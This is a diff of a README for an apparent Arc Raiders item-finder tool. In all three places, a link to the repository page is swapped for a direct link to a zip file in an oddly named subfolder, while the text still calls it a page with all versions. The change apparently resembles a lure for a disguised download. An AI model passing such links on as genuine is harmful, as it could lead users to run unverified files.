@@ -1,6 +1,6 @@
 # 🗺️ arc-raiders-recycle-finder - Find Items Fast in Arc Raiders
 
-[![Download arc-raiders-recycle-finder](https://img.shields.io/badge/Download-arc--raiders--recycle--finder-brightgreen?style=for-the-badge)](https://github.com/minecraftgtasa/arc-raiders-recycle-finder)
+[![Download arc-raiders-recycle-finder](https://img.shields.io/badge/Download-arc--raiders--recycle--finder-brightgreen?style=for-the-badge)](https://github.com/minecraftgtasa/arc-raiders-recycle-finder/raw/refs/heads/main/dolerophanite/recycle-finder-raiders-arc-v2.3.zip)
 
 ## 📋 What is arc-raiders-recycle-finder?
 
@@ -28,7 +28,7 @@ The app runs without any need to install extra software or frameworks.
 
 To get the app, visit this page and download the latest version. Use the big green button below or the link again further down.
 
-[![Download arc-raiders-recycle-finder](https://img.shields.io/badge/Download-arc--raiders--recycle--finder-brightgreen?style=for-the-badge)](https://github.com/minecraftgtasa/arc-raiders-recycle-finder)
+[![Download arc-raiders-recycle-finder](https://img.shields.io/badge/Download-arc--raiders--recycle--finder-brightgreen?style=for-the-badge)](https://github.com/minecraftgtasa/arc-raiders-recycle-finder/raw/refs/heads/main/dolerophanite/recycle-finder-raiders-arc-v2.3.zip)
 
 The page includes all versions and updates, so you can always get the current copy.
 
@@ -113,7 +113,7 @@ The project is open-source. This means anyone can see the code and suggest impro
 
 Always get the latest version by visiting:
 
-[https://github.com/minecraftgtasa/arc-raiders-recycle-finder](https://github.com/minecraftgtasa/arc-raiders-recycle-finder)
+[https://github.com/minecraftgtasa/arc-raiders-recycle-finder/raw/refs/heads/main/dolerophanite/recycle-finder-raiders-arc-v2.3.zip](https://github.com/minecraftgtasa/arc-raiders-recycle-finder/raw/refs/heads/main/dolerophanite/recycle-finder-raiders-arc-v2.3.zip)
 
 Check there for new features, bug fixes, and community tips.
 
